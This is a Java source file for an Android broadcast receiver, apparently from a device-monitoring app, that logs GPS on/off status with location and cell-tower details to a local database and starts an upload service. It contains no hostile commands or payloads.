package org.sn.recievers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.location.LocationManager;
import android.os.Bundle;

import com.mobiocean.database.DatabaseHabdler_SMSSent;
import com.mobiocean.service.UploadService;
import com.mobiocean.util.CallHelper;
import com.mobiocean.util.Struct_Send_SMSInfo;

import org.sn.location.LocationBean;
import org.sn.location.LocationDetails;

public class GpsLocationReceiver extends BroadcastReceiver {


    @Override
    public void onReceive(Context context, Intent intent) {
        String TimeStamp = CallHelper.GetTimeWithDate();
        DatabaseHabdler_SMSSent SMS_db = DatabaseHabdler_SMSSent.getInstance(context);
        LocationDetails locationDetails = new LocationDetails(context);
        LocationBean locationBean = locationDetails.getLocation();
        String locSrc = "Google";
        if (locationBean.IsGPS)
            locSrc = "GPS";
        double lat = 0.0;
        double lon = 0.0;
        if (locationBean.IsGPS) {
            try {
                lat = Double.parseDouble(locationBean.Lat);
                lon = Double.parseDouble(locationBean.Longt);
            } catch (Exception ignore) {
            }
        }
        LocationManager manager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        if (manager != null) {
            if (manager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                SMS_db.addSMS(new Struct_Send_SMSInfo(601, TimeStamp, "ON", "" + locSrc, lat, lon, 16, System.currentTimeMillis(), locationBean.CellId, locationBean.LAC, locationBean.MCC, locationBean.MNC));
            } else {
                SMS_db.addSMS(new Struct_Send_SMSInfo(601, TimeStamp, "OFF", "" + locSrc, lat, lon, 16, System.currentTimeMillis(), locationBean.CellId, locationBean.LAC, locationBean.MCC, locationBean.MNC));
            }
        }
        Intent msgIntent = new Intent(context, UploadService.class);
        Bundle b = new Bundle();
        msgIntent.putExtra("UploadStatus", 0);
        msgIntent.putExtras(b);
        context.startService(msgIntent);
    }
}